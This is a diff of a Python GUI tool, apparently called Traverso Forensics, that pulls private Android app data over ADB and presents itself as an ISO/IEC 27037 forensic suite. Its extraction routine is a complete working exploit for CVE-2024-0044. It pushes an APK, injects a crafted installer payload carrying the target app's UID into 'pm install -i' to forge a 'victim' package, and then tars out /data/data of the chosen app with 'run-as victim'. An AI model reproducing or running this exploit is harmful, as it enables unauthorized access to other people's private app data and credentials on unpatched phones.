+       apps_frame = tk.Frame(panel, bg=self.bg_input)
+       apps_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
+       
+       scrollbar = tk.Scrollbar(apps_frame, bg=self.bg_input)
+       scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+       
+       self.apps_listbox = tk.Listbox(apps_frame, bg=self.bg_input, fg=self.fg_text,
+                                      font=("Consolas", 9), relief=tk.FLAT, borderwidth=0,
+                                      selectbackground=self.accent_blue, selectforeground="white",
+                                      yscrollcommand=scrollbar.set)
+       self.apps_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
+       scrollbar.config(command=self.apps_listbox.yview)
+       self.apps_listbox.bind('<<ListboxSelect>>', self.on_app_select)
+       
+       return panel
+   
+   def create_right_panel(self, parent):
+       """Create right panel with extraction controls"""
+       panel = tk.Frame(parent, bg=self.bg_panel)
+       
+       # Selected Application section
+       tk.Label(panel, text="Selected Application", font=("Segoe UI", 12, "bold"),
+               foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(15, 10))
+       
+       info_frame = tk.Frame(panel, bg=self.bg_panel)
+       info_frame.pack(fill=tk.X, padx=15, pady=(0, 10))
+       
+       tk.Label(info_frame, text="Package:", font=("Segoe UI", 9, "bold"),
+               background=self.bg_panel, foreground=self.fg_secondary).pack(anchor=tk.W)
+       self.package_label = tk.Label(info_frame, text="None", font=("Segoe UI", 10),
+                                     background=self.bg_panel, foreground=self.fg_text, wraplength=400)
+       self.package_label.pack(anchor=tk.W, pady=(0, 10))
+       
+       tk.Label(info_frame, text="UID:", font=("Segoe UI", 9, "bold"),
+               background=self.bg_panel, foreground=self.fg_secondary).pack(anchor=tk.W)
+       self.uid_label = tk.Label(info_frame, text="None", font=("Segoe UI", 10),
+                                  background=self.bg_panel, foreground=self.fg_text)
+       self.uid_label.pack(anchor=tk.W)
+       
+       # Progress section
+       self.progress = ttk.Progressbar(panel, mode='determinate', length=300, 
+                                      style="blue.Horizontal.TProgressbar")
+       self.progress.pack(fill=tk.X, padx=15, pady=(10, 5))
+       
+       self.progress_label = tk.Label(panel, text="", bg=self.bg_panel, fg=self.fg_text, 
+                                     font=("Segoe UI", 9))
+       self.progress_label.pack(fill=tk.X, padx=15, pady=(0, 10))
+       
+       # Start button
+       self.start_btn = tk.Button(panel, text="Start Forensic Extraction", bg=self.bg_input, 
+                                  fg=self.fg_text, font=("Segoe UI", 11, "bold"), relief=tk.FLAT, 
+                                  padx=20, pady=12, cursor="hand2", command=self.start_extraction, 
+                                  state=tk.DISABLED)
+       self.start_btn.pack(fill=tk.X, padx=15, pady=10)
+       
+       # Status/Log section
+       tk.Label(panel, text="Extraction Status & Log", font=("Segoe UI", 10, "bold"),
+               foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(10, 5))
+       
+       log_frame = tk.Frame(panel, bg=self.bg_input)
+       log_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
+       
+       self.log_text = scrolledtext.ScrolledText(log_frame, bg=self.bg_input, fg=self.fg_text,
+                                                  font=("Consolas", 9), relief=tk.FLAT,
+                                                  borderwidth=0, height=15)
+       self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+       self.log_text.insert(1.0, "Ready to start forensic extraction...\n\nPlease connect device and select an application.")
+       self.log_text.config(state=tk.DISABLED)
+       
+       return panel
+   
+   def create_footer(self):
+       """Create footer with status"""
+       footer = tk.Frame(self.root, bg=self.bg_panel, height=80)
+       footer.pack(fill=tk.X, side=tk.BOTTOM)
+       footer.pack_propagate(False)
+       
+       # Left side - Status
+       left_frame = tk.Frame(footer, bg=self.bg_panel)
+       left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=20, pady=10)
+       
+       self.status_label = tk.Label(left_frame,
+                                    text="Status: Ready",
+                                    font=('Segoe UI', 10),
+                                    foreground=self.fg_text,
+                                    background=self.bg_panel,
+                                    anchor=tk.W)
+       self.status_label.pack(fill=tk.X)
+       
+       self.footer_progress_label = tk.Label(left_frame,
+                                      text="",
+                                      font=('Segoe UI', 9),
+                                      foreground=self.fg_secondary,
+                                      background=self.bg_panel,
+                                      anchor=tk.W)
+       self.footer_progress_label.pack(fill=tk.X)
+       
+       # Right side - Forensic compliance indicator
+       right_frame = tk.Frame(footer, bg=self.bg_panel)
+       right_frame.pack(side=tk.RIGHT, padx=20, pady=10)
+       
+       tk.Label(right_frame, text="ISO/IEC 27037:2012",
+               font=("Segoe UI", 8),
+               foreground=self.fg_secondary,
+               background=self.bg_panel).pack()
+       
+       # Store last extraction directory
+       self.last_extraction_dir = None
+
+   def update_device_status(self, connected, message, details=""):
+       """Update device status indicator with colors"""
+       if connected:
+           self.status_indicator.config(foreground=self.accent_green)
+           self.connection_status_label.config(text=message, foreground=self.accent_green)
+       else:
+           self.status_indicator.config(foreground=self.accent_red)
+           self.connection_status_label.config(text=message, foreground=self.accent_red)
+       
+       # Update device info text
+       self.device_text.config(state=tk.NORMAL)
+       self.device_text.delete(1.0, tk.END)
+       self.device_text.insert(1.0, details)
+       self.device_text.config(state=tk.DISABLED)
+
+   def write_log(self, message, level="INFO"):
+       """Write to log display with forensic timestamp"""
+       timestamp = time.strftime("%H:%M:%S")
+       
+       # Color coding
+       if level == "SUCCESS":
+           prefix = "✅"
+       elif level == "WARNING":
+           prefix = "⚠️ "
+       elif level == "ERROR":
+           prefix = "❌"
+       else:
+           prefix = "ℹ️ "
+       
+       log_entry = f"[{timestamp}] {prefix} {message}\n"
+       
+       # Store in buffer for forensic log
+       self.log_buffer.append(f"[{timestamp}] [{level}] {message}")
+       
+       self.root.after(0, lambda: self._append_log(log_entry))
+       
+       # Also write to file if available
+       if self.log_file:
+           try:
+               with open(self.log_file, 'a', encoding='utf-8') as f:
+                   f.write(f"[{timestamp}] [{level}] {message}\n")
+           except:
+               pass
+       
+       # Save to entries
+       self.log_entries.append({"timestamp": timestamp, "level": level, "message": message})
+   
+   def _append_log(self, text):
+       """Append to log text widget"""
+       self.log_text.config(state=tk.NORMAL)
+       self.log_text.insert(tk.END, text)
+       self.log_text.see(tk.END)
+       self.log_text.config(state=tk.DISABLED)
+   
+   def save_log_to_file(self, extraction_dir):
+       """Save complete forensic log to file"""
+       try:
+           log_filename = os.path.join(extraction_dir, "extraction_log.txt")
+           with open(log_filename, 'w', encoding='utf-8') as f:
+               f.write("="*70 + "\n")
+               f.write("TRAVERSO FORENSICS - FORENSIC EXTRACTION LOG\n")
+               f.write("="*70 + "\n")
+               f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+               f.write(f"Standard: ISO/IEC 27037:2012\n")
+               f.write(f"Extraction Method: CVE-2024-0044 (Payload Injection)\n")
+               f.write("="*70 + "\n\n")
+               
+               for line in self.log_buffer:
+                   f.write(line + "\n")
+               
+               f.write("\n" + "="*70 + "\n")
+               f.write("END OF FORENSIC LOG\n")
+               f.write("="*70 + "\n")
+           
+           self.write_log(f"✅ Forensic log saved: {log_filename}", "SUCCESS")
+           return log_filename
+       except Exception as e:
+           self.write_log(f"❌ Error saving log: {e}", "ERROR")
+           return None
+   
+   def update_progress(self, step, total, message):
+       """Update progress bar"""
+       percentage = (step / total) * 100
+       self.root.after(0, lambda: self.progress.configure(value=percentage))
+       self.root.after(0, lambda: self.progress_label.config(text=message))
+       self.root.after(0, lambda: self.footer_progress_label.config(text=message))
+   
+   def check_adb_installed(self):
+       """Verify ADB is installed and accessible"""
+       try:
+           result = subprocess.run(["adb", "version"], 
+                                 capture_output=True, 
+                                 text=True, 
+                                 timeout=5)
+           if result.returncode == 0:
+               version_line = result.stdout.split('\n')[0]
+               self.write_log(f"ADB found: {version_line}", "SUCCESS")
+               return True
+           else:
+               self.write_log("ADB command failed", "ERROR")
+               self.update_device_status(False, "ADB Error", 
+                   "ADB command execution failed\n\nPlease reinstall Android SDK Platform Tools")
+               return False
+       except FileNotFoundError:
+           self.write_log("ADB not found in system PATH", "ERROR")
+           self.update_device_status(False, "ADB Not Installed",
+               "Android Debug Bridge (ADB) is not installed\n\n"
+               "Installation steps:\n"
+               "1. Download Android SDK Platform Tools\n"
+               "2. Extract to a folder (e.g., C:\\platform-tools)\n"
+               "3. Add folder to system PATH\n"
+               "4. Restart this application")
+           messagebox.showerror("ADB Not Found", 
+                              "ADB (Android Debug Bridge) is not installed or not in PATH.\n\n"
+                              "Please install Android SDK Platform Tools:\n"
+                              "1. Download from developer.android.com\n"
+                              "2. Add to system PATH\n"
+                              "3. Restart application")
+           return False
+       except subprocess.TimeoutExpired:
+           self.write_log("ADB command timeout", "ERROR")
+           self.update_device_status(False, "ADB Timeout",
+               "ADB command timed out after 5 seconds\n\n"
+               "Possible causes:\n"
+               "• ADB server not responding\n"
+               "• System performance issues\n\n"
+               "Try restarting ADB server manually:\n"
+               "adb kill-server && adb start-server")
+           return False
+       except Exception as e:
+           self.write_log(f"Error checking ADB: {e}", "ERROR")
+           self.update_device_status(False, "ADB Error", f"Unexpected error: {str(e)}")
+           return False
+   
+   def start_adb_server(self):
+       """Start ADB server"""
+       try:
+           self.write_log("Starting ADB server...", "INFO")
+           result = subprocess.run(["adb", "start-server"], 
+                                 capture_output=True, 
+                                 text=True, 
+                                 timeout=10)
+           if result.returncode == 0:
+               self.write_log("ADB server started", "SUCCESS")
+               return True
+           else:
+               self.write_log(f"ADB server start warning: {result.stderr}", "WARNING")
+               return True
+       except subprocess.TimeoutExpired:
+           self.write_log("ADB server start timeout", "ERROR")
+           self.update_device_status(False, "Connection Timeout",
+               "ADB server failed to start (timeout after 10s)\n\n"
+               "Try manually:\n"
+               "1. Open command prompt/terminal\n"
+               "2. Run: adb kill-server\n"
+               "3. Run: adb start-server\n"
+               "4. Click 'Refresh' button")
+           return False
+       except Exception as e:
+           self.write_log(f"Error starting ADB server: {e}", "ERROR")
+           return False
+   
+   def get_device_info(self):
+       """Get detailed device information"""
+       try:
+           # Get device model
+           model_result = subprocess.run(
+               ["adb", "shell", "getprop", "ro.product.model"],
+               capture_output=True,
+               text=True,
+               timeout=5
+           )
+           model = model_result.stdout.strip() if model_result.returncode == 0 else "Unknown"
+           
+           # Get Android version
+           version_result = subprocess.run(
+               ["adb", "shell", "getprop", "ro.build.version.release"],
+               capture_output=True,
+               text=True,
+               timeout=5
+           )
+           version = version_result.stdout.strip() if version_result.returncode == 0 else "Unknown"
+           
+           # Get manufacturer
+           manufacturer_result = subprocess.run(
+               ["adb", "shell", "getprop", "ro.product.manufacturer"],
+               capture_output=True,
+               text=True,
+               timeout=5
+           )
+           manufacturer = manufacturer_result.stdout.strip() if manufacturer_result.returncode == 0 else "Unknown"
+           
+           # Get security patch
+           patch_result = subprocess.run(
+               ["adb", "shell", "getprop", "ro.build.version.security_patch"],
+               capture_output=True,
+               text=True,
+               timeout=5
+           )
+           patch = patch_result.stdout.strip() if patch_result.returncode == 0 else "Unknown"
+           
+           info_text = f"{manufacturer} {model}\nAndroid {version}\nSecurity Patch: {patch}"
+           
+           self.update_device_status(True, "Device Connected", info_text)
+           
+           self.write_log(f"Device: {manufacturer} {model} (Android {version})", "SUCCESS")
+           
+           return info_text
+           
+       except subprocess.TimeoutExpired:
+           self.write_log("Device info retrieval timeout", "WARNING")
+           self.update_device_status(True, "Device Connected", 
+               "Device connected but info retrieval timed out\n\n"
+               "Device may be slow to respond or ADB connection unstable")
+           return "Device info unavailable (timeout)"
+       except Exception as e:
+           self.write_log(f"Could not get device info: {e}", "WARNING")
+           return "Device info unavailable"
+   
+   def auto_detect_device(self):
+       """Auto-detect device on startup"""
+       self.write_log("Checking for connected devices...", "INFO")
+       self.check_device()
+   
+   def run_adb_command(self, command, shell=False, timeout=30):
+       """Execute ADB command"""
+       try:
+           if shell:
+               full_command = ["adb", "shell"] + command.split()
+           else:
+               full_command = ["adb"] + command.split()
+           
+           result = subprocess.run(full_command, capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=timeout)
+           return result.stdout, result.stderr, result.returncode
+       except subprocess.TimeoutExpired:
+           return "", f"Command timeout after {timeout} seconds", -1
+       except Exception as e:
+           return None, str(e), 1
+   
+   def check_device(self):
+       """Check if device is connected"""
+       self.update_device_status(False, "Checking...", "Detecting connected devices...")
+       
+       def check():
+           # Check ADB installed
+           if not self.check_adb_installed():
+               self.device_connected.set(False)
+               return
+           
+           # Start ADB server
+           if not self.start_adb_server():
+               self.device_connected.set(False)
+               return
+           
+           time.sleep(0.5)
+           
+           stdout, stderr, code = self.run_adb_command("devices")
+           
+           if code != 0:
+               self.device_connected.set(False)
+               self.update_device_status(False, "ADB Command Failed",
+                   f"Error executing 'adb devices'\n\n{stderr}\n\n"
+                   "Try:\n"
+                   "1. Restart ADB server: adb kill-server && adb start-server\n"
+                   "2. Check USB cable connection\n"
+                   "3. Click 'Refresh' button")
+               self.write_log("ADB devices command failed", "ERROR")
+               return
+           
+           lines = stdout.strip().split('\n')
+           devices = [line for line in lines[1:] if line.strip() and 'device' in line]
+           
+           if not devices:
+               self.device_connected.set(False)
+               self.update_device_status(False, "No Device Detected",
+                   "No Android devices found\n\n"
+                   "Connection steps:\n"
+                   "1. Connect device via USB cable\n"
+                   "2. Enable 'USB Debugging' in Developer Options\n"
+                   "3. Authorize this computer on device screen\n"
+                   "4. Click 'Detect Device' or 'Refresh' button\n\n"
+                   "If device is connected:\n"
+                   "• Check USB cable (try different cable/port)\n"
+                   "• Enable 'USB Debugging' in Settings > Developer Options\n"
+                   "• Unlock device screen")
+               self.write_log("No devices detected", "WARNING")
+               return
+           
+           self.device_connected.set(True)
+           
+           # Get device info
+           self.get_device_info()
+           
+           # Enable apps button
+           self.listapps_btn.config(state=tk.NORMAL, bg=self.accent_blue)
+           
+           self.write_log("Device connected successfully", "SUCCESS")
+       
+       thread = threading.Thread(target=check)
+       thread.daemon = True
+       thread.start()
+   
+   def get_package_uid(self, package):
+       """Get UID for a specific package - Critical for payload injection"""
+       try:
+           result = subprocess.run(
+               ["adb", "shell", "pm", "list", "packages", "-U"],
+               capture_output=True,
+               text=True,
+               timeout=30
+           )
+           
+           for line in result.stdout.split('\n'):
+               if f"package:{package}" in line:
+                   parts = line.split()
+                   for part in parts:
+                       if "uid:" in part:
+                           uid = part.replace("uid:", "").strip()
+                           self.write_log(f"Package UID: {uid}", "INFO")
+                           return uid
+           
+           self.write_log(f"Could not determine UID for {package}", "ERROR")
+           return None
+           
+       except Exception as e:
+           self.write_log(f"Error getting package UID: {e}", "ERROR")
+           return None
+   
+   def list_all_apps(self):
+       """List all installed applications with UIDs"""
+       self.write_log("Fetching installed applications with UIDs...", "INFO")
+       self.apps_listbox.delete(0, tk.END)
+       self.apps_list = []
+       
+       def fetch():
+           stdout, stderr, code = self.run_adb_command("pm list packages -U", shell=True, timeout=60)
+           
+           if code != 0 or not stdout:
+               self.write_log("Failed to fetch apps", "ERROR")
+               messagebox.showerror("Error", 
+                   f"Failed to list applications\n\n"
+                   f"Error: {stderr if stderr else 'Unknown error'}\n\n"
+                   f"Try:\n"
+                   f"• Check device connection\n"
+                   f"• Ensure USB debugging is enabled\n"
+                   f"• Click 'Refresh' and try again")
+               return
+           
+           lines = stdout.strip().split('\n')
+           
+           for line in lines:
+               if "package:" in line and "uid:" in line:
+                   try:
+                       parts = line.split()
+                       package = parts[0].replace("package:", "")
+                       uid = parts[1].replace("uid:", "")
+                       
+                       # Determine if third-party or native
+                       is_third_party = not any(prefix in package for prefix in 
+                                               ['com.android', 'com.google', 'android', 'com.samsung'])
+                       
+                       app_type = "third_party" if is_third_party else "native"
+                       
+                       self.apps_list.append({
+                           "package": package,
+                           "uid": uid,
+                           "type": app_type
+                       })
+                   except:
+                       continue
+           
+           self.write_log(f"Found {len(self.apps_list)} applications with UIDs", "SUCCESS")
+           self.filter_apps()
+       
+       thread = threading.Thread(target=fetch)
+       thread.daemon = True
+       thread.start()
+   
+   def filter_apps(self):
+       """Filter displayed apps"""
+       self.apps_listbox.delete(0, tk.END)
+       
+       filter_type = self.app_filter.get()
+       search_term = self.search_var.get().lower()
+       
+       for app in self.apps_list:
+           # Filter by type
+           if filter_type != "all" and app["type"] != filter_type:
+               continue
+           
+           # Filter by search
+           if search_term and search_term not in app["package"].lower():
+               continue
+           
+           display = f"{app['package']} (UID: {app['uid']})"
+           self.apps_listbox.insert(tk.END, display)
+   
+   def on_app_select(self, event):
+       """Handle app selection"""
+       selection = self.apps_listbox.curselection()
+       if not selection:
+           return
+       
+       selected_text = self.apps_listbox.get(selection[0])
+       package = selected_text.split(" (UID:")[0]
+       uid = selected_text.split("UID: ")[1].rstrip(")")
+       
+       self.selected_package.set(package)
+       self.selected_uid.set(uid)
+       
+       self.package_label.config(text=package)
+       self.uid_label.config(text=uid)
+       
+       # Enable extraction button
+       self.start_btn.config(state=tk.NORMAL, bg=self.accent_green)
+       
+       self.write_log(f"Selected: {package} (UID: {uid})", "INFO")
+   
+   def calculate_hash256(self, filepath):
+       """Calculate SHA256 hash for forensic integrity"""
+       sha256 = hashlib.sha256()
+       with open(filepath, 'rb') as f:
+           for chunk in iter(lambda: f.read(8192), b''):
+               sha256.update(chunk)
+       return sha256.hexdigest()
+   
+   def generate_extraction_report(self, package, extraction_dir):
+       """Genera un reporte TXT con detalles específicos de la extracción"""
+       self.write_log("Generando reporte de detalles de extracción...", "INFO")
+       
+       # 1. Obtener versión de la aplicación
+       version = "Desconocida"
+       try:
+           # Ejecuta dumpsys para buscar la linea versionName
+           cmd = f"dumpsys package {package} | grep versionName"
+           stdout, _, _ = self.run_adb_command(cmd, shell=True, timeout=10)
+           if stdout:
+               # La salida suele ser "    versionName=X.X.X"
+               version = stdout.strip().replace("versionName=", "")
+       except Exception as e:
+           self.write_log(f"No se pudo obtener la versión de la app: {e}", "WARNING")
+
+       # 2. Obtener Fecha, Hora y Zona Horaria
+       now = datetime.now().astimezone()
+       fecha_hora = now.strftime("%d/%m/%Y %H:%M:%S")
+       
+       # Intentar obtener el nombre de la zona horaria, si falla usar el offset
+       zona_horaria = now.tzname()
+       if not zona_horaria:
+           zona_horaria = str(now.utcoffset())
+
+       # 3. Definir método
+       metodo = "CVE-2024-0044 (Payload Injection) - ISO/IEC 27037:2012"
+
+       # 4. Crear el archivo TXT
+       filename = os.path.join(extraction_dir, "detalles_extraccion.txt")
+       
+       try:
+           with open(filename, 'w', encoding='utf-8') as f:
+               f.write("="*60 + "\n")
+               f.write("REPORTE DE EXTRACCIÓN FORENSE\n")
+               f.write("="*60 + "\n\n")
+               f.write(f"Aplicación Extraída: {package}\n")
+               f.write(f"Versión de la App:   {version}\n")
+               f.write(f"Método Utilizado:    {metodo}\n")
+               f.write("-" * 60 + "\n")
+               f.write(f"Fecha de Extracción: {fecha_hora}\n")
+               f.write(f"Zona Horaria:        {zona_horaria}\n")
+               f.write("="*60 + "\n")
+           
+           self.write_log(f"✅ Reporte de detalles guardado: {os.path.basename(filename)}", "SUCCESS")
+           return True
+       except Exception as e:
+           self.write_log(f"❌ Error al guardar reporte de detalles: {e}", "ERROR")
+           return False
+
+   def start_extraction(self):
+       """Start forensic extraction"""
+       if not self.device_connected.get():
+           messagebox.showwarning("No Device", 
+                                "Please connect a device first.\n\n"
+                                "Steps:\n"
+                                "1. Connect device via USB\n"
+                                "2. Enable USB debugging\n"
+                                "3. Click 'Detect Device' or 'Refresh' button")
+           return
+       
+       package = self.selected_package.get()
+       if not package:
+           messagebox.showwarning("No App Selected", "Please select an application first")
+           return
+       
+       # Clear log buffer for new extraction
+       self.log_buffer = []
+       
+       # Clear log display
+       self.log_text.config(state=tk.NORMAL)
+       self.log_text.delete(1.0, tk.END)
+       self.log_text.config(state=tk.DISABLED)
+       
+       # Run in thread
+       thread = threading.Thread(target=self.run_extraction, args=(package,))
+       thread.daemon = True
+       thread.start()
+   
+   def run_extraction(self, package):
+       """Run complete forensic extraction process - ISO/IEC 27037:2012 compliant"""
+       try:
+           self.start_btn.config(state=tk.DISABLED, bg=self.bg_input)
+           
+           # Create output directory with forensic naming
+           timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+           package_clean = package.replace('.', '_')
+           self.extraction_dir = f"extraction_{package_clean}_{timestamp}"
+           os.makedirs(self.extraction_dir, exist_ok=True)
+           
+           self.write_log("="*70, "INFO")
+           self.write_log("TRAVERSO FORENSICS - PROFESSIONAL EXTRACTION Suite v1.0", "SUCCESS")
+           self.write_log("="*70, "INFO")
+           self.write_log(f"Standard: ISO/IEC 27037:2012", "INFO")
+           self.write_log(f"Exploit: CVE-2024-0044 (Payload Injection Method)", "INFO")
+           self.write_log(f"Target Package: {package}", "INFO")
+           self.write_log(f"Output Directory: {self.extraction_dir}", "INFO")
+           self.write_log(f"Extraction Time: {datetime.now().isoformat()}", "INFO")
+           self.write_log("="*70, "INFO")
+           
+           # Initialize verifier
+           self.verifier = ForensicVerification(log_callback=self.write_log)
+           
+           # PHASE 1: PRE-EXTRACTION VERIFICATION
+           self.update_progress(1, 10, "Phase 1/4: Pre-extraction verification...")
+           self.write_log("\n▶ PHASE 1: PRE-EXTRACTION VERIFICATION", "INFO")
+           
+           if not self.verifier.run_pre_verification(package):
+               messagebox.showerror("Verification Failed", "Pre-extraction checks failed. See log for details.")
+               self.save_log_to_file(self.extraction_dir)
+               return
+           
+           # PHASE 2: CVE-2024-0044 EXPLOITATION (PAYLOAD INJECTION METHOD)
+           self.update_progress(2, 10, "Phase 2/4: CVE-2024-0044 exploitation...")
+           self.write_log("\n▶ PHASE 2: CVE-2024-0044 EXPLOITATION (PAYLOAD INJECTION)", "INFO")
+           self.write_log("Method: pm install -i with malformed installer package", "INFO")
+           
+           # Get UID of target package
+           self.write_log(f"Getting UID for {package}...", "INFO")
+           uid = self.get_package_uid(package)
+           
+           if not uid:
+               self.write_log("Failed to get package UID - using fallback method", "WARNING")
+               uid = self.selected_uid.get()
+               if not uid or uid == "None":
+                   messagebox.showerror("Error", 
+                       f"Could not determine UID for {package}\n\n"
+                       f"Please ensure the package is installed and try again.")
+                   self.save_log_to_file(self.extraction_dir)
+                   return
+           
+           self.write_log(f"Target UID: {uid}", "SUCCESS")
+           
+           # Find traverso.apk
+           self.write_log("Locating exploit APK...", "INFO")
+           apk_path = "traverso.apk"
+           if not os.path.exists(apk_path):
+               # Try subdirectories
+               for root, dirs, files in os.walk("."):
+                   if "traverso.apk" in files:
+                       apk_path = os.path.join(root, "traverso.apk")
+                       break
+           
+           if not os.path.exists(apk_path):
+               self.write_log("traverso.apk not found", "ERROR")
+               messagebox.showerror("Error", 
+                   "traverso.apk not found in current directory\n\n"
+                   "Please ensure traverso.apk is in the same folder as this application")
+               self.save_log_to_file(self.extraction_dir)
+               return
+           
+           self.write_log(f"Found APK: {apk_path}", "SUCCESS")
+           
+           # Push APK to device
+           self.update_progress(3, 10, "Pushing exploit APK...")
+           self.write_log("Pushing exploit APK to device...", "INFO")
+           
+           result = subprocess.run(
+               ["adb", "push", apk_path, "/data/local/tmp/traverso.apk"],
+               capture_output=True, text=True, timeout=30
+           )
+           if result.returncode != 0:
+               self.write_log(f"Failed to push APK: {result.stderr}", "ERROR")
+               self.save_log_to_file(self.extraction_dir)
+               return
+           
+           self.write_log("APK pushed successfully", "SUCCESS")
+           
+           # Execute exploit with payload injection
+           self.update_progress(4, 10, "Executing payload injection exploit...")
+           self.write_log("Executing CVE-2024-0044 exploit (Payload Injection)...", "INFO")
+           
+           # Create payload with actual UID
+           payload = f"""@null
+victim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"""
+           
+           self.write_log(f"Payload created with UID: {uid}", "INFO")
+           
+           # Execute pm install with -i flag (THE ACTUAL EXPLOIT)
+           install_cmd = f"""PAYLOAD={shlex.quote(payload)}
+pm install -i "$PAYLOAD" /data/local/tmp/traverso.apk"""
+           
+           self.write_log("Installing with malformed installer package...", "INFO")
+           
+           result = subprocess.run(
+               ["adb", "shell", install_cmd],
+               capture_output=True, text=True, timeout=60
+           )
+           
+           if result.returncode != 0 and "already exists" not in result.stdout.lower():
+               self.write_log(f"Install warning: {result.stderr}", "WARNING")
+               self.write_log(f"Output: {result.stdout}", "INFO")
+           else:
+               self.write_log("Payload injection completed", "SUCCESS")
+           
+           # Verify exploit success
+           self.update_progress(5, 10, "Verifying exploit success...")
+           self.write_log("Verifying exploit...", "INFO")
+           
+           time.sleep(2)
+           
+           # Test access with run-as victim
+           test_result = subprocess.run(
+               ["adb", "shell", "run-as", "victim", "id"],
+               capture_output=True, text=True, timeout=10
+           )
+           
+           if test_result.returncode == 0 and "uid=" in test_result.stdout:
+               self.write_log(f"Exploit SUCCESS - victim user created: {test_result.stdout.strip()}", "SUCCESS")
+           else:
+               self.write_log("Exploit verification inconclusive - proceeding with extraction", "WARNING")
+           
+           # Stream TAR directly using run-as victim
+           self.update_progress(6, 10, "Extracting application data...")
+           self.write_log("Streaming TAR archive from device...", "INFO")
+           
+           tar_filename = f"{package_clean}_backup.tar"
+           output_file = os.path.join(self.extraction_dir, tar_filename)
+           
+           # Extract /data/data/{package}
+           self.write_log(f"Extracting /data/data/{package}...", "INFO")
+           
+           # Use shell command to properly redirect stderr
+           tar_shell_cmd = f"run-as victim tar -cf - /data/data/{package} 2>/dev/null"
+           
+           self.write_log(f"TAR command: adb shell {tar_shell_cmd}", "INFO")
+           
+           try:
+               with open(output_file, 'wb') as tar_file:
+                   process = subprocess.Popen(
+                       ["adb", "shell", tar_shell_cmd],
+                       stdout=tar_file,
+                       stderr=subprocess.PIPE
+                   )
+                   
+                   _, stderr = process.communicate(timeout=300)
+                   code = process.returncode
+               
+               file_size = os.path.getsize(output_file)
+               
+               if file_size == 0:
+                   self.write_log("TAR is EMPTY (0 bytes)", "ERROR")
+                   self.write_log(f"stderr: {stderr.decode('utf-8', errors='replace') if stderr else 'No error output'}", "ERROR")
+                   messagebox.showerror("Extraction Failed", 
+                       "TAR file is EMPTY. Exploit failed to access package data.\n\n"
+                       "Possible causes:\n"
+                       "• Device security patch blocked exploit\n"
+                       "• SELinux is blocking access\n"
+                       "• Package has no accessible data\n\n"
+                       "Check the log for details.")
+                   self.save_log_to_file(self.extraction_dir)
+                   return
+               
+               self.write_log(f"TAR extracted: {file_size} bytes ({file_size/1024/1024:.2f} MB)", "SUCCESS")
+               
+               # Verify minimum size - TAR header is 512 bytes, so 1024 means empty archive
+               if file_size <= 1024:
+                   self.write_log(f"⚠️  TAR file is EMPTY or only contains header ({file_size} bytes)", "ERROR")
+                   self.write_log(f"stderr output: {stderr.decode('utf-8', errors='replace') if stderr else 'None'}", "ERROR")
+                   
+                   # Try alternative extraction methods
+                   self.write_log("Attempting alternative extraction method...", "WARNING")
+                   
+                   # Try /data/user_de/0/{package}
+                   self.write_log(f"Trying /data/user_de/0/{package}...", "INFO")
+                   tar_shell_cmd_alt = f"run-as victim tar -cf - /data/user_de/0/{package} 2>/dev/null"
+                   
+                   with open(output_file, 'wb') as tar_file:
+                       process = subprocess.Popen(
+                           ["adb", "shell", tar_shell_cmd_alt],
+                           stdout=tar_file,
+                           stderr=subprocess.PIPE
+                       )
+                       _, stderr_alt = process.communicate(timeout=300)
+                   
+                   file_size_alt = os.path.getsize(output_file)
+                   
+                   if file_size_alt > 1024:
+                       self.write_log(f"Alternative extraction successful: {file_size_alt} bytes", "SUCCESS")
+                       file_size = file_size_alt
+                   else:
+                       self.write_log("Alternative extraction also failed", "ERROR")
+                       messagebox.showerror("Extraction Failed",
+                           f"Failed to extract data from both locations:\n"
+                           f"• /data/data/{package}\n"
+                           f"• /data/user_de/0/{package}\n\n"
+                           f"Possible causes:\n"
+                           f"• Exploit failed to grant access\n"
+                           f"• Package has no data in these locations\n"
+                           f"• SELinux is blocking access\n\n"
+                           f"Check the log for stderr details.")
+                       self.save_log_to_file(self.extraction_dir)
+                       return
+               
+           except subprocess.TimeoutExpired:
+               self.write_log("TAR extraction timeout (5 minutes)", "ERROR")
+               messagebox.showerror("Timeout", 
+                   "TAR extraction timed out after 5 minutes.\n\n"
+                   "Possible causes:\n"
+                   "• Very large application data\n"
+                   "• Slow device or USB connection\n"
+                   "• Device performance issues")
+               self.save_log_to_file(self.extraction_dir)
+               return
+           except Exception as e:
+               self.write_log(f"Exception during extraction: {e}", "ERROR")
+               import traceback
+               self.write_log(traceback.format_exc(), "ERROR")
+               self.save_log_to_file(self.extraction_dir)
+               return
+           
+           # Calculate SHA256 for forensic integrity
+           self.update_progress(7, 10, "Calculating SHA256 hash...")
+           self.write_log("Calculating SHA256 hash (Forensic Integrity)...", "INFO")
+           
+           hash_value = self.calculate_hash256(output_file)
+           hash_path = os.path.join(self.extraction_dir, f"{package_clean}_backup_SHA256.txt")
+           
+           with open(hash_path, 'w', encoding='utf-8') as f:
+               f.write("="*70 + "\n")
+               f.write("TRAVERSO FORENSICS - INTEGRITY VERIFICATION\n")
+               f.write("="*70 + "\n")
+               f.write(f"File: {tar_filename}\n")
+               f.write(f"SHA256: {hash_value}\n")
+               f.write(f"Date: {datetime.now().isoformat()}\n")
+               f.write(f"Package: {package}\n")
+               f.write(f"UID: {uid}\n")
+               f.write(f"Size: {file_size} bytes ({file_size/1024/1024:.2f} MB)\n")
+               f.write(f"Standard: ISO/IEC 27037:2012\n")
+               f.write("="*70 + "\n")
+           
+           self.write_log(f"SHA256: {hash_value}", "SUCCESS")
+           self.write_log(f"Hash file saved: {hash_path}", "SUCCESS")
+           
+           # Cleanup device - Chain of Custody
+           self.write_log("Cleaning up device (Chain of Custody)...", "INFO")
+           
+           # Remove APK
+           cleanup_result = subprocess.run(
+               ["adb", "shell", "rm", "-f", "/data/local/tmp/traverso.apk"],
+               capture_output=True, timeout=10
+           )
